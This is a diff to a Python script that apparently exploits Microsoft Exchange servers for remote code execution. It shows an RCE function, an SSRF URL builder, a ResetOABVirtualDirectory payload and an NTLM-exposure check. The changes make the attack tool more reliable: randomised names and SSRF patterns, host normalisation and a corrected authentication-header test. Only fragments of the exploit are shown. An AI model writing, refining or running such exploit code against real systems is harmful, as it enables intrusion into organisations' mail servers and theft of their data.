@@ -4,7 +4,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def gen():
-    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(0x5))
+    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(0x5))
 
 use_name = gen()
 user_agent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36"}
@@ -29,7 +29,8 @@ ResetOABVirtualDirectory = {'identity': {'__type': 'Identity:ECP','DisplayName':
 def RCE(host, email):
     session = requests.Session()
     session.headers.update(user_agent)
-
+    
+    host = host if not host.endswith("/") else host[:-1]
     print("host: {} - email: {}".format(host, email))
 
     print("[+] leaking required infos ..")
@@ -66,7 +67,7 @@ def RCE(host, email):
 
 def get_CN(session, host):
     if any(char.isdigit() for char in use_name) or len(use_name) < 3:
-        pattern = "asdfsdfaasdf"
+        pattern = ''.join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(0x8))
     else:
         pattern = use_name.lower()
     ssrf_url = "[{0}]@{0}/".format(pattern)
@@ -315,7 +316,7 @@ def ntlm_exposed(session, url):
     session.headers.update(auth_request)
     response = session.get(url, verify=False)
 
-    if "NTLM" in response.headers["WWW-Authenticate"] and response.headers["WWW-Authenticate"]:
+    if "NTLM" in response.headers["WWW-Authenticate"] and "Negotiate" in response.headers["WWW-Authenticate"]:
             return True
     else:
             return False
